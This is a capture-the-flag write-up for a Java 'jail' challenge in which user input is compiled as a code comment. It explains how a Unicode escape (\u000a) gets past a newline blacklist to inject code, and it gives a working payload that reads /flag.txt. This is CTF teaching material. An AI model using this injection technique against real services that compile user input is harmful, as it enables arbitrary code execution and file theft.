# jail/vibe-coding

## Challenge Summary
b01lers is looking for a vibe coder to fix our Java codebase! Just write a comment, and our bleeding-edge LLM agent will fill in the rest.*

Disclaimer: model not yet implemented.

`ncat --ssl vibe-coding.atreides.b01lersc.tf 8443`

## Overview

Connect to ncat --ssl vibe-coding.atreides.b01lersc.tf 8443. The service runs a Python script (server.py) that takes your input, inserts it as a comment in a Java template, compiles, and executes it.  
Our goal is exploit this to read /flag.txt.

**Setup**: Docker with pwn.red/jail, flag at /srv/flag.txt, accessible as /flag.txt in Java.  
**Server Script**: Blacklists \r, \n. Input becomes // <input> in:

```java
public class Main {
    // %s
    public static void main(String[] args) {}
    public static String getFlag() throws IOException {
        throw new RuntimeException("Not implemented yet");
    }
}
```

**Vulnerability**: Java processes Unicode escapes (e.g., \u000a = newline) before compilation. \u000a bypasses blacklist, ends comment, allowing code injection.

## Solution

Inject a static block to read and print `/flag.txt`:  

```java
\u000a static { try { java.io.BufferedReader br = new java.io.BufferedReader(new java.io.FileReader("/flag.txt")); System.out.println(br.readLine()); } catch (Exception e) { } }
```
